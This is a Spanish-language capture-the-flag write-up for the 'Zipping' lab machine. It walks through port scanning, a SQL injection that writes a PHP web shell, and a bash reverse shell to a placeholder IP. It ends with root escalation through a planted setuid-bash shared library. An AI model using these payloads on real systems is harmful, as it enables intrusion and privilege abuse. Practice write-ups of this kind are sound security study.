

![1](</Writeups/Maquinas/Zipping/img/logo.png>)
By Rug4lo

## Reconocimiento 

Primero empezamos con el típico escaneo con nmap
```bash
nmap -p- --open -T5 -sS -min-rate 5000 -vvv -n -Pn -oG allports 10.10.11.229
```
```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-15 18:15 CEST
Initiating SYN Stealth Scan at 18:15
Scanning 10.10.11.229 [65535 ports]
Discovered open port 80/tcp on 10.10.11.229
Discovered open port 22/tcp on 10.10.11.229
Completed SYN Stealth Scan at 18:16, 14.88s elapsed (65535 total ports)
Nmap scan report for 10.10.11.229
Host is up, received user-set (0.10s latency).
Scanned at 2023-09-15 18:15:47 CEST for 15s
Not shown: 65069 closed tcp ports (reset), 464 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.98 seconds
           Raw packets sent: 73404 (3.230MB) | Rcvd: 71641 (2.866MB)
```
Después hacemos un escaneo enviando unos scripts básicos de reconocimiento 
```bash
nmap -sCV -A -p22,80 -oN targeted 10.10.11.229
```
```bash
# Nmap 7.93 scan initiated Mon Aug 28 19:07:30 2023 as: nmap -sCV -p22,80 -oN target 10.10.11.229
Nmap scan report for 10.10.11.229
Host is up (0.33s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 9d6eec022d0f6a3860c6aaac1ee0c284 (ECDSA)
|_  256 eb9511c7a6faad74aba2c5f6a4021841 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Ubuntu))
|_http-title: Zipping | Watch store
|_http-server-header: Apache/2.4.54 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Aug 28 19:07:46 2023 -- 1 IP address (1 host up) scanned in 16.12 seconds
```
Podemos observar que tiene una pagina web, de primeras podemos pensar que se trata de un Abuso de Subida de archivos, pero no

Si investigamos la pagina veremos que hay un apartado de venta de relojes 
```bash
http://10.10.11.229/shop/index.php?page=product&id=2
```

## SQLI

Aquí podemos hacer una SQL Injection

Si probamos a hacer un sleep veremos que no nos funciona 
```bash
2'+or+sleep(5)--+-
```
Pero si lo ponernos de esta manera veremos que si que nos funciona
```bash
%0D%0A%27+or+sleep(5)--+-1
```
Ahora podemos ir tanteando para ver el numero de columnas
```bash
product&id=%0D%0A'+order+by+8--+-1
```
Una vez que encontremos el numero podemos ver el usuario que esta corriendo la base de datos y el nombre de esta
```bash
product&id=%0D%0A'+union+select+1,database(),user(),4,5,6,7,8--+-1
```
También podrías ir sacando la información de esa base de datos, pero no tendrá nada mas que los relojes

## SQLI to RCE

Por ello vamos a intentar ejecutar comandos, primero vamos a crear un archivo PHP en la carpeta 
```bash
product&id=%0A%0D'+union select "<?php system($_GET['cmd']);?>",2,3,4,5,6,7,8 into outfile "/dev/shm/script.php" -- -1
```
Y después vamos a ejecutarlo de esta manera 
```bash
index.php?page=/dev/shm/script&cmd=id
```
Ahora que tenemos ejecución remota de comandos podemos mandarnos una reverse shell
```bash
?page=/dev/shm/shell&cmd=bash -c "bash -i >%26 /dev/tcp/nuestraip/443 0>%261"
```
Con esto si nos vamos al directorio del usuario tendremos la primera flag

![1](</Writeups/Maquinas/Zipping/img/1.png>)

## Escalada de privilegios

Si hacemos un sudo -l podremos ver que tenemos acceso a un binario como root 
```bash
sudo -l 
```
Si vemos la información de ese binario con el comando strings podremos encontrar una contraseña, cuando la ponemos nos da acceso a unas opciones, las cuales no nos servirán de nada 

Si seguimos investigando veremos que es posible que se pueda depurar el flujo del programa
```bash
strace /usr/bin/stock
```
Después de ver el fujo del programa veremos que al introducir la contraseña intenta cargar un archivo que no existe, creamos el archivo con extension .c
```bash
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Y lo compilamos en la carpeta donde esta tratando de ejecutarlo el programa
```bash
gcc -shared -o /home/rektsu/.config/libcounter.so -fPIC [ File.c ]
```
Después ejecutamos el binario, y ponemos la contraseña, esto nos pasara una bash como root 